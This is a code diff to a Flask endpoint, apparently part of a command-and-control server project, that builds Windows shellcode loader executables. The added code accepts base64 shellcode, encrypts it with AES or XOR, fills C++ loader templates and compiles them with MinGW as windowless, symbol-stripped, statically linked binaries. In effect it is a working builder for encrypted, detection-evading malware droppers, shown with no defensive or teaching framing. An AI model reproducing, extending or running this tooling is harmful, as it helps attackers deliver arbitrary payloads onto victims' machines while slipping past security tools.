@@ -6,6 +6,8 @@ import base64
 import tempfile
 import subprocess
 import platform
+import random
+import string
 
 # Add the parent directory to the path to import from C2_Server
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -98,6 +100,8 @@ def generate_loader_exe():
     
     Expected payload (either JSON or form data):
     - shellcode: base64_encoded_shellcode
+    - encryption: encryption type ('aes' or 'xor')
+    - key: optional encryption key
     
     Returns:
         The compiled executable file for download
@@ -108,25 +112,117 @@ def generate_loader_exe():
         
         # Extract shellcode from either JSON or form data
         shellcode_b64 = None
+        encryption_type = 'aes'  # Default to AES
+        key = None
         
         if request.is_json:
             data = request.get_json()
             if data:
                 shellcode_b64 = data.get('shellcode')
+                encryption_type = data.get('encryption', 'aes')
+                key = data.get('key')
         else:
             # Try form data
             shellcode_b64 = request.form.get('shellcode')
+            encryption_type = request.form.get('encryption', 'aes')
+            key = request.form.get('key')
             
         if not shellcode_b64:
             return jsonify({'error': 'Shellcode is required'}), 400
             
-        print(f"Received shellcode (length: {len(shellcode_b64)})")
-            
-        # Generate loader executable
-        exe_path = generate_loader(shellcode_b64)
+        print(f"Received shellcode (length: {len(shellcode_b64)}), encryption: {encryption_type}")
         
-        if not exe_path or not os.path.exists(exe_path):
-            return jsonify({'error': 'Failed to generate loader executable. Check if MinGW is installed.'}), 500
+        # Import modules needed for encryption
+        from encrypt_aes import encrypt_shellcode, generate_random_key
+        import os
+        import tempfile
+        
+        # Decode shellcode
+        try:
+            shellcode_bytes = base64.b64decode(shellcode_b64)
+        except:
+            return jsonify({'error': 'Invalid base64 encoded shellcode'}), 400
+        
+        # Choose appropriate template based on encryption type
+        if encryption_type.lower() == 'aes':
+            template_path = os.path.join(os.path.dirname(__file__), "cpp_templates/dynamic_shellcode_loader_template.cpp")
+            
+            # Generate random AES key and IV if none provided
+            aes_key = key.encode() if key else generate_random_key(16)
+            aes_iv = generate_random_key(16)  # Always generate random IV
+            
+            # Encrypt shellcode
+            encryption_result = encrypt_shellcode(shellcode_bytes, aes_key, aes_iv)
+            encrypted_b64 = encryption_result['encrypted']
+            key_str = encryption_result['key_str']
+            iv_str = encryption_result['iv_str']
+            
+            # Load template and replace placeholders
+            with open(template_path, "r") as f:
+                template = f.read()
+                
+            loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
+            loader_code = loader_code.replace("###AES_KEY###", key_str)
+            loader_code = loader_code.replace("###AES_IV###", iv_str)
+            
+        elif encryption_type.lower() == 'xor':
+            template_path = os.path.join(os.path.dirname(__file__), "cpp_templates/xor_shellcode_loader_template.cpp")
+            
+            # Generate random XOR key if none provided
+            xor_key = key if key else ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+            
+            # XOR encrypt shellcode
+            encrypted_bytes = shellcode_gen.xor_encrypt(shellcode_bytes, xor_key)
+            encrypted_b64 = base64.b64encode(encrypted_bytes).decode()
+            
+            # Load template and replace placeholders
+            with open(template_path, "r") as f:
+                template = f.read()
+                
+            loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
+            loader_code = loader_code.replace("###XOR_KEY###", xor_key)
+            
+        else:
+            return jsonify({'error': f'Unsupported encryption type: {encryption_type}'}), 400
+            
+        # Create output paths
+        output_dir = os.path.join(os.path.dirname(__file__), "compiled")
+        os.makedirs(output_dir, exist_ok=True)
+        cpp_path = os.path.join(output_dir, f"loader_{os.urandom(4).hex()}.cpp")
+        exe_path = os.path.splitext(cpp_path)[0] + '.exe'
+        
+        # Write the loader code to file
+        with open(cpp_path, "w") as f:
+            f.write(loader_code)
+        
+        # Compile the code
+        if not check_mingw():
+            return jsonify({'error': 'MinGW compiler (x86_64-w64-mingw32-g++) not found! Please install it to compile the loader.'}), 500
+            
+        compile_cmd = [
+            "x86_64-w64-mingw32-g++", 
+            cpp_path,
+            "-o", exe_path,
+            "-mwindows",
+            "-s",  # Strip symbols
+            "-static-libgcc", "-static-libstdc++",  # Static linking
+        ]
+        
+        result = subprocess.run(
+            compile_cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        
+        # Clean up the source file
+        try:
+            os.unlink(cpp_path)
+        except:
+            pass
+        
+        if result.returncode != 0:
+            error_msg = result.stderr.decode()
+            return jsonify({'error': f'Compilation failed: {error_msg}'}), 500
             
         print(f"Generated loader at {exe_path}")
             
